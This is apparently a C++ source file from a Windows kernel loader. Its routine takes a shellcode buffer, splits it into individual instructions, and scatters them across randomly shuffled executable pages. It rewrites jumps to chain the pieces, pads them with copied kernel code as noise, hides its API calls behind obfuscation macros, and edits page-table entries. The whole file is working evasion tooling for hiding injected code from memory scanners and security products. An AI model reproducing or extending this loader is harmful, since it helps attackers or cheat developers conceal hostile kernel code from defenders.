#include "lde.hpp"

#define SLOT_SIZE         0x100 
#define MAP_HEADER        0x8 
#define MAX_INSTR         32   
#define BATCH_SLOTS       15   
#define BATCH_SIZE        0x1000 
#define BATCH_SKEW_MAX    (BATCH_SIZE - BATCH_SLOTS * SLOT_SIZE) 

#define PFN_SCRAMBLE_X    3  
#define PFN_OVERALLOC_MAX 768  
#define PFN_NOISE_EVERY   32 
#define PFN_NOISE_BURST   24 

#define NOISE_SRC_BASE    0x10000 
#define NOISE_SRC_RANGE   0x200000 
#define NOISE_CHUNK_MIN   32 
#define NOISE_CHUNK_RANGE 192 

typedef struct _SENTENCE {
    lde::Insn hs;
    INT       Id;
    INT       Rva;
    INT       Length;
    BYTE*     OrigBegin;
    INT       OrigLength;
    INT64     JmpDistance;
    INT       DstId; 
    INT       NextId; 
    BOOLEAN   IsFromRipTarget;
    ULONG64   PoolBlock;
    ULONG64   KernelPtr; 
} SENTENCE, *PSENTENCE;

static __forceinline ULONG Random32(ULONG64 entropy, ULONG i) {
    ULONG s = MBA_XOR(ULONG, static_cast<ULONG>(MBA_XOR(ULONG64, __rdtsc(), entropy)), (ULONG)(i * 0xBC8F4D29u));
    s = KLI_OBFUSCATE_CALL(KliProtected::seed::mix)(s, 0xC1);
    return KLI_OBFUSCATE_CALL(KliProtected::seed::mix_b)(s, 0xC2);
}

static __forceinline ULONG64 Random64(ULONG64 entropy, ULONG i) {
    return MBA_OR(ULONG64, (ULONG64)KLI_OBFUSCATE_CALL(Random32)(entropy, i * 2) << 32, KLI_OBFUSCATE_CALL(Random32)(entropy, i * 2 + 1));
}

static __forceinline ULONG HashRva(INT rva) {
    ULONG x = MBA_ADD(ULONG, (ULONG)rva, 1);
    x = MBA_XOR(ULONG, x, x << 13);
    x = MBA_XOR(ULONG, x, x >> 17);
    x = MBA_XOR(ULONG, x, x << 5);
    return x;
}

static __forceinline INT HashLookup(INT* table, ULONG mask, PSENTENCE arr, INT rva) {
    ULONG h = KLI_OBFUSCATE_CALL(HashRva)(rva) & mask;
    for (ULONG probe = 0; probe <= mask; probe++) {
        INT idx = table[(h + probe) & mask];
        if (idx < 0) return -1;
        if (arr[idx].Rva == rva) return idx;
    }
    return -1;
}

static __forceinline VOID HashInsert(INT* table, ULONG mask, INT rva, INT idx) {
    ULONG h = KLI_OBFUSCATE_CALL(HashRva)(rva) & mask;
    for (ULONG probe = 0; probe <= mask; probe++) {
        ULONG slot = (h + probe) & mask;
        if (table[slot] < 0) { table[slot] = idx; return; }
    }
}

static __forceinline VOID FillRealCodeNoise(PUCHAR dst, SIZE_T len, ULONG64 NT_Base, ULONG64 entropy, ULONG seed) {
    SIZE_T off = 0;
    ULONG i = 0;
    while (off < len) {
        SIZE_T srcOff = NOISE_SRC_BASE + (KLI_OBFUSCATE_CALL(Random32)(entropy, seed + i++) % NOISE_SRC_RANGE);
        SIZE_T chunk  = NOISE_CHUNK_MIN + (KLI_OBFUSCATE_CALL(Random32)(entropy, seed + i++) % NOISE_CHUNK_RANGE);
        if (off + chunk > len) chunk = len - off;
        __movsb(dst + off, (BYTE*)(NT_Base + srcOff), chunk);
        off += chunk;
    }
}

static __forceinline INT WriteJmpRel32(PUCHAR dst, ULONG64 dstKp) {
    LONG64 delta = (LONG64)dstKp - (LONG64)(dst + 5);
    if (delta < (LONG64)INT32_MIN || delta > (LONG64)INT32_MAX) return 0;
    dst[0] = 0xE9;
    *(volatile LONG*)(dst + 1) = (LONG)delta;
    return 5;
}

static __forceinline INT WriteJmpAbs(PUCHAR dst, ULONG64 dstKp) {
    dst[0] = 0x48;
    dst[1] = 0xB8;
    *(volatile ULONG64*)(dst + 2) = dstKp;
    dst[10] = 0xFF;
    dst[11] = 0xE0;
    return 12;
}

static __forceinline INT WriteJmp(PUCHAR dst, ULONG64 dstKp, ULONG64 entropy, ULONG seed) {
    LONG64 delta = (LONG64)dstKp - (LONG64)(dst + 5);
    if (delta < (LONG64)INT32_MIN || delta > (LONG64)INT32_MAX) return KLI_OBFUSCATE_CALL(WriteJmpAbs)(dst, dstKp);

    INT pad = 0;
    switch (KLI_OBFUSCATE_CALL(Random32)(entropy, seed) & 0x3) {
    case 1: dst[0] = 0x90; pad = 1; break;
    case 2: dst[0] = 0x66; dst[1] = 0x90; pad = 2; break;
    case 3: dst[0] = 0x90; dst[1] = 0x90; pad = 2; break; 
    default: break;
    }

    LONG64 d2 = (LONG64)dstKp - (LONG64)(dst + pad + 5);
    dst[pad + 0] = 0xE9;
    *(volatile LONG*)(dst + pad + 1) = (LONG)d2;
    return pad + 5;
}

static __forceinline VOID InitSentence(PSENTENCE s, INT id, INT rva, BYTE* origBegin, INT len, const lde::Insn& in, BOOLEAN fromRipTarget) {
    s->hs = in;
    s->Id = id;
    s->Rva = rva;
    s->Length = len;
    s->OrigBegin = origBegin;
    s->OrigLength = len;
    s->DstId = -1;
    s->NextId = -1;
    s->IsFromRipTarget = fromRipTarget;
    if (KLI_OBFUSCATE_CALL(lde::IsRewriteTarget)(in)) s->JmpDistance = in.rel_distance;
}

static __forceinline VOID FreeBatches(ULONG64 NT_Base, ULONG64* batchHeads, INT batchCount) {
    auto _MmFreeContiguousMemory = KLI_FN(NT_Base, MmFreeContiguousMemory);
    if (!_MmFreeContiguousMemory) return;
    for (INT i = 0; i < batchCount; i++) {
        if (batchHeads[i]) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)((PVOID)batchHeads[i]);
    }
}

static __forceinline INT RewriteRipInsn(PUCHAR dst, const SENTENCE& s, ULONG64 dstKp, const BYTE* orig, INT origLen, ULONG64 entropy, ULONG seed) {
    BYTE op = s.hs.opcode;

    switch (op) {
    case 0x8D: {
        BYTE rex = 0x48;
        BYTE reg = s.hs.modrm_reg;
        if (s.hs.rex_r == 1) { rex |= 0x01; reg &= 0x7; }
        dst[0] = rex;
        dst[1] = 0xB8 + (reg & 0x7);
        *(volatile ULONG64*)(dst + 2) = dstKp;
        return 10;
    }
    case 0xE8:
        dst[0] = 0x48;
        dst[1] = 0xB8;
        *(volatile ULONG64*)(dst + 2) = dstKp;
        dst[10] = 0xFF;
        dst[11] = 0xD0;
        return 12;
    case 0xE9:
    case 0xEB:
        return WriteJmp(dst, dstKp, entropy, seed);
    }

    BYTE invShort = 0;
    if (op >= 0x70 && op <= 0x7F) {
        invShort = MBA_XOR(BYTE, op, 0x01);
    }
    else if (op == 0x0F) {
        BYTE op2 = s.hs.opcode2;
        if (op2 >= 0x80 && op2 <= 0x8F)
            invShort = (BYTE)(MBA_OR(BYTE, MBA_XOR(BYTE, (op2 - 0x80), 0x01), 0x70));
    }
    if (!invShort) {
        __movsb(dst, orig, origLen);
        return origLen;
    }

    dst[0] = invShort;
    dst[1] = 0x05; 
    INT n = KLI_OBFUSCATE_CALL(WriteJmpRel32)(dst + 2, dstKp);
    if (n) return 2 + n;
    dst[1] = 0x0C; 
    return 2 + KLI_OBFUSCATE_CALL(WriteJmpAbs)(dst + 2, dstKp);
}

static __declspec(noinline) ULONG64 MapShellcodeScattered(ULONG64 NT_Base, PMap pMap, PHYSICAL_ADDRESS MaxPhysAddr, UCHAR* shellData, INT shellSize) {
    SPOOF_FUNC;

    if (!shellData || shellSize <= 0) return 0;

    auto _ExAllocatePoolWithTag = KLI_FN(NT_Base, ExAllocatePoolWithTag);
    auto _ExFreePoolWithTag = KLI_FN(NT_Base, ExFreePoolWithTag);
    auto _MmAllocateContiguousNodeMemory = KLI_FN(NT_Base, MmAllocateContiguousNodeMemory);
    auto _MmFreeContiguousMemory = KLI_FN(NT_Base, MmFreeContiguousMemory);
    if (!_ExAllocatePoolWithTag || !_ExFreePoolWithTag || !_MmAllocateContiguousNodeMemory || !_MmFreeContiguousMemory) return 0;

    ULONG32 tag = pMap->MEMORY_TAG.AlcI;
    PSENTENCE sentences = nullptr;
    INT* hashTable = nullptr;
    ULONG64* batchHeads = nullptr;
    INT batchCount = 0;
    ULONG64 entryPtr = 0;

    do {
        INT capacity = shellSize;
        SIZE_T arrSize = sizeof(SENTENCE) * capacity;
        sentences = (PSENTENCE)KLI_OBFUSCATE_CALL(_ExAllocatePoolWithTag)(NonPagedPoolNx, arrSize, tag);
        if (!sentences) break;
        __stosb((PUCHAR)sentences, 0, arrSize);

        ULONG hashCapacity = 1;
        while (hashCapacity < (ULONG)capacity * 2) hashCapacity <<= 1;
        ULONG hashMask = hashCapacity - 1;
        SIZE_T hashArrSize = sizeof(INT) * hashCapacity;
        hashTable = (INT*)KLI_OBFUSCATE_CALL(_ExAllocatePoolWithTag)(NonPagedPoolNx, hashArrSize, tag);
        if (!hashTable) break;
        __stosb((PUCHAR)hashTable, 0xFF, hashArrSize);

        lde::Insn hs;
        INT total = 0, scanned = 0;
        BYTE* cursor = shellData;
        while (scanned < shellSize) {
            INT len = (INT)KLI_OBFUSCATE_CALL(lde::Decode)(cursor, (UINT32)(shellSize - scanned), &hs);
            if (!len) break;
            KLI_OBFUSCATE_CALL(InitSentence)(&sentences[total], total, scanned, cursor, len, hs, FALSE);
            KLI_OBFUSCATE_CALL(HashInsert)(hashTable, hashMask, scanned, total);
            total++;
            scanned += len;
            cursor += len;
        }
        if (total == 0) break;

        for (INT scanIdx = 0; scanIdx < total; ) {
            INT targets[2], numTargets = 0;
            SENTENCE& cur = sentences[scanIdx];
            if (cur.JmpDistance) {
                INT dstRva = cur.Rva + cur.Length + (INT)cur.JmpDistance;
                if (dstRva >= 0 && dstRva < shellSize) targets[numTargets++] = dstRva;
            }
            if (cur.IsFromRipTarget) {
                INT nextRva = cur.Rva + cur.Length;
                if (nextRva >= 0 && nextRva < shellSize) targets[numTargets++] = nextRva;
            }

            BOOLEAN didExtend = FALSE;
            for (INT t = 0; t < numTargets && !didExtend; t++) {
                INT rva = targets[t];
                if (KLI_OBFUSCATE_CALL(HashLookup)(hashTable, hashMask, sentences, rva) >= 0) continue;
                if (total >= capacity) continue;

                BYTE* newCursor = shellData + rva;
                INT newLen = (INT)KLI_OBFUSCATE_CALL(lde::Decode)(newCursor, (UINT32)(shellSize - rva), &hs);
                if (!newLen) continue;

                KLI_OBFUSCATE_CALL(InitSentence)(&sentences[total], total, rva, newCursor, newLen, hs, TRUE);
                KLI_OBFUSCATE_CALL(HashInsert)(hashTable, hashMask, rva, total);
                total++;
                didExtend = TRUE;
            }
            if (!didExtend) scanIdx++;
        }

        batchCount = (total + BATCH_SLOTS - 1) / BATCH_SLOTS;
        SIZE_T batchArrSize = sizeof(ULONG64) * batchCount;
        batchHeads = (ULONG64*)KLI_OBFUSCATE_CALL(_ExAllocatePoolWithTag)(NonPagedPoolNx, batchArrSize, tag);
        if (!batchHeads) break;
        __stosb((PUCHAR)batchHeads, 0, batchArrSize);

        INT cpuRegs[4];
        __cpuid(cpuRegs, 1);
        ULONG64 cpuEntropy = MBA_OR(ULONG64, (ULONG64)cpuRegs[0] << 32, (ULONG64)cpuRegs[3]);

        PHYSICAL_ADDRESS lowPhys; lowPhys.QuadPart = 0;
        PHYSICAL_ADDRESS zeroBoundary; zeroBoundary.QuadPart = 0;

        INT overAlloc = batchCount * PFN_SCRAMBLE_X;
        if (overAlloc > PFN_OVERALLOC_MAX) overAlloc = (batchCount > PFN_OVERALLOC_MAX) ? batchCount : PFN_OVERALLOC_MAX;
        ULONG64* candidates = (ULONG64*)KLI_OBFUSCATE_CALL(_ExAllocatePoolWithTag)(NonPagedPoolNx, sizeof(ULONG64) * overAlloc, tag);
        if (!candidates) break;
        __stosb((PUCHAR)candidates, 0, sizeof(ULONG64) * overAlloc);

        ULONG64 noiseBuf[PFN_NOISE_BURST];
        INT gotCount = 0;
        for (INT k = 0; k < overAlloc; k++) {
            if (k > 0 && (k % PFN_NOISE_EVERY) == 0) {
                INT noiseGot = 0;
                for (INT n = 0; n < PFN_NOISE_BURST; n++) {
                    PVOID np = KLI_OBFUSCATE_CALL(_MmAllocateContiguousNodeMemory)(BATCH_SIZE, lowPhys, MaxPhysAddr, zeroBoundary, PAGE_EXECUTE_READWRITE, MM_ANY_NODE_OK);
                    if (!np) break;
                    noiseBuf[noiseGot++] = (ULONG64)np;
                }
                for (INT n = 0; n < noiseGot; n++) {
                    KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)((PVOID)noiseBuf[n]);
                }
            }
            PVOID page = KLI_OBFUSCATE_CALL(_MmAllocateContiguousNodeMemory)(BATCH_SIZE, lowPhys, MaxPhysAddr, zeroBoundary, PAGE_EXECUTE_READWRITE, MM_ANY_NODE_OK);
            if (!page) break;
            candidates[gotCount++] = (ULONG64)page;
        }

        if (gotCount < batchCount) { 
            for (INT k = 0; k < gotCount; k++) {
                if (candidates[k]) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)((PVOID)candidates[k]);
            }
            KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(candidates, tag);
            break;
        }

        for (INT k = gotCount - 1; k > 0; k--) {
            ULONG j = KLI_OBFUSCATE_CALL(Random32)(cpuEntropy, (ULONG)k * 31 + 0x5AC3) % (ULONG)(k + 1);
            ULONG64 tmp = candidates[k];
            candidates[k] = candidates[j];
            candidates[j] = tmp;
        }

        volatile ULONG64* dstBh = batchHeads;
        volatile ULONG64* srcBh = candidates;
        for (INT b = 0; b < batchCount; b++) dstBh[b] = srcBh[b];

        for (INT k = batchCount; k < gotCount; k++) {
            KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)((PVOID)candidates[k]);
        }
        KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(candidates, tag);

        for (INT b = 0; b < batchCount; b++) {
            ULONG64 batch = batchHeads[b];
            KLI_OBFUSCATE_CALL(FillRealCodeNoise)((PUCHAR)batch, BATCH_SIZE, NT_Base, cpuEntropy, (ULONG)b * 7 + 0xBC8F);

            ULONG batchSkew = KLI_OBFUSCATE_CALL(Random32)(cpuEntropy, (ULONG)b + 0xD35A) % BATCH_SKEW_MAX;

            INT slotPerm[BATCH_SLOTS];
            for (INT k = 0; k < BATCH_SLOTS; k++) slotPerm[k] = k;
            for (INT k = BATCH_SLOTS - 1; k > 0; k--) {
                ULONG j = KLI_OBFUSCATE_CALL(Random32)(cpuEntropy, (ULONG)(b * 0xBC8F + k)) % (ULONG)(k + 1);
                INT tmp = slotPerm[k];
                slotPerm[k] = slotPerm[j];
                slotPerm[j] = tmp;
            }

            INT slotStart = b * BATCH_SLOTS;
            INT slotEnd = slotStart + BATCH_SLOTS;
            if (slotEnd > total) slotEnd = total;
            ULONG maxOff = SLOT_SIZE - MAX_INSTR;
            for (INT i = slotStart; i < slotEnd; i++) {
                INT slot = slotPerm[i - slotStart];
                sentences[i].PoolBlock = batch + (ULONG64)batchSkew + (ULONG64)slot * SLOT_SIZE;
                ULONG offset = MAP_HEADER + (KLI_OBFUSCATE_CALL(Random32)(cpuEntropy, (ULONG)i + 0xA5A5) % (maxOff - MAP_HEADER));
                sentences[i].KernelPtr = sentences[i].PoolBlock + offset;
            }
        }

        for (INT i = 0; i < total; i++) {
            INT nextRva = sentences[i].Rva + sentences[i].Length;
            sentences[i].NextId = KLI_OBFUSCATE_CALL(HashLookup)(hashTable, hashMask, sentences, nextRva);
            if (sentences[i].JmpDistance) {
                INT dstRva = nextRva + (INT)sentences[i].JmpDistance;
                sentences[i].DstId = KLI_OBFUSCATE_CALL(HashLookup)(hashTable, hashMask, sentences, dstRva);
            }
        }

        for (INT i = 0; i < total; i++) {
            SENTENCE& s = sentences[i];
            PUCHAR dst = (PUCHAR)s.KernelPtr;
            INT cur = 0;

            if (s.JmpDistance && s.DstId >= 0) {
                cur = KLI_OBFUSCATE_CALL(RewriteRipInsn)(dst, s, sentences[s.DstId].KernelPtr, s.OrigBegin, s.OrigLength, cpuEntropy, MBA_XOR(ULONG, (ULONG)i, 0x4D29));
            }
            else if (!(s.JmpDistance && s.DstId < 0)) {
                __movsb(dst, s.OrigBegin, s.OrigLength);
                cur = s.OrigLength;
            }

            if (s.NextId >= 0) cur += KLI_OBFUSCATE_CALL(WriteJmp)(dst + cur, sentences[s.NextId].KernelPtr, cpuEntropy, MBA_XOR(ULONG, (ULONG)i, 0xBC8F));
        }

        entryPtr = sentences[0].KernelPtr;
        ULONG64 shellBase = entryPtr - MAP_HEADER;
        ULONG64 mapKey = KLI_OBFUSCATE_CALL(DeriveKey)(shellBase);
        ULONG64 pMapAddr = (ULONG64)pMap;
        *(volatile ULONG32*)(shellBase + 0x0) = MBA_XOR(ULONG32, (ULONG32)pMapAddr, (ULONG32)mapKey);
        *(volatile ULONG32*)(shellBase + 0x4) = MBA_XOR(ULONG32, (ULONG32)(pMapAddr >> 32), (ULONG32)(mapKey >> 32));

        ULONG64 itKey7 = KLI_OBFUSCATE_CALL(GetPMapKey)(pMap);
        ULONG64 realPteBase7 = MBA_XOR(ULONG64, pMap->System.PteBase, itKey7);
        for (INT b = 0; b < batchCount; b++) {
            ULONG64 va = batchHeads[b];
            ULONG64* pte = MiGetPteAddress(realPteBase7, va);
            if (pte && *pte) {
                *pte = MBA_AND(ULONG64, *pte, MBA_NOT(ULONG64, (ULONG64)2)); 
                __invlpg((PVOID)va); 
            }
        }
    } while (0);

    if (batchHeads) {
        if (!entryPtr) KLI_OBFUSCATE_CALL(FreeBatches)(NT_Base, batchHeads, batchCount);
        KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(batchHeads, tag);
    }
    if (hashTable) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(hashTable, tag);
    if (sentences) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(sentences, tag);

    return entryPtr;
}